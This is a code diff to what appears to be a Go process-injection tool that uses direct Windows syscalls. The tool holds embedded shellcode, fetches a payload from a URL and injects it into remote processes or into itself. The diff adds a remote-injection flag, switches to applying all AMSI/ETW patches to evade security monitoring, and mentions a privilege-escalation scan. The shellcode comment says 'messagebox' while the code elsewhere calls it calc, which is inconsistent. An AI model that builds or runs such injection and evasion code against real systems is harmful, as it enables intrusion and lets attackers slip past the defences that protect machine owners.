@@ -26,7 +26,7 @@ func min(a, b int) int {
 	return b
 }
 
-// getEmbeddedShellcode returns the embedded calc shellcode as bytes
+// messagebox shellcode :3
 func getEmbeddedShellcode() []byte {
 	hexString := "505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3"
 	
@@ -38,7 +38,6 @@ func getEmbeddedShellcode() []byte {
 	}
 	return bytes
 }
-
 
 
 // Process information structure
@@ -339,6 +338,7 @@ func main() {
 	exampleFlag := flag.Bool("example", false, "Execute embedded calc shellcode (uses self-injection by default)")
 	dumpFlag := flag.Bool("dump", false, "Dump all available syscalls from ntdll.dll")
 	selfFlag := flag.Bool("self", false, "Use self-injection instead of remote process injection")
+	remoteFlag := flag.Bool("remote", false, "Use remote process injection (can be combined with -example)")
 	debugFlag := flag.Bool("debug", false, "Enable debug logging for all operations")
 	privescFlag := flag.Bool("privesc", false, "Scan for privilege escalation vectors and test exploitation (no files created)")
 
@@ -549,6 +549,7 @@ func main() {
 			fmt.Println("  ./go-direct-syscall.exe -url http://example.com/payload.bin                    # Remote injection")
 			fmt.Println("  ./go-direct-syscall.exe -url http://example.com/payload.bin -self             # Self injection")
 			fmt.Println("  ./go-direct-syscall.exe -example                                              # Self injection with embedded calc")
+			fmt.Println("  ./go-direct-syscall.exe -example -remote                                      # Remote injection with embedded calc")
 			fmt.Println("  ./go-direct-syscall.exe -dump                                                 # Dump syscalls")
 			fmt.Println("  ./go-direct-syscall.exe -privesc                                              # Scan for privilege escalation vectors")
 			fmt.Println("  ./go-direct-syscall.exe -debug -example                                       # Self injection with debug logging")
@@ -565,7 +566,10 @@ func main() {
 	}
 	
 	// Determine injection method: self-injection or remote injection
-	useSelfInjection := *exampleFlag || *selfFlag // Default to self-injection for example mode
+	// If -self is explicitly used, force self-injection
+	// If -remote is used with -example, do remote injection
+	// Otherwise, -example defaults to self-injection
+	useSelfInjection := (*exampleFlag && !*remoteFlag) || *selfFlag
 	
 	var selectedProcess ProcessInfo
 	
@@ -703,14 +707,14 @@ func main() {
 		fmt.Printf("Payload size: %d bytes\n", len(payload))
 		
 		// Call remote injection func and patch amsi/etw 
-		winapi.ApplyCriticalPatches()
+		winapi.ApplyAllPatches()
 		err = winapi.NtInjectRemote(processHandle, payload)
 		
 		if err != nil {
 			fmt.Printf("Remote injection failed: %v\n", err)
 		} else {
 			fmt.Printf("Remote injection Successful\n")
-			winapi.SelfDel()
+			// winapi.SelfDel()
 		}
 	}
 
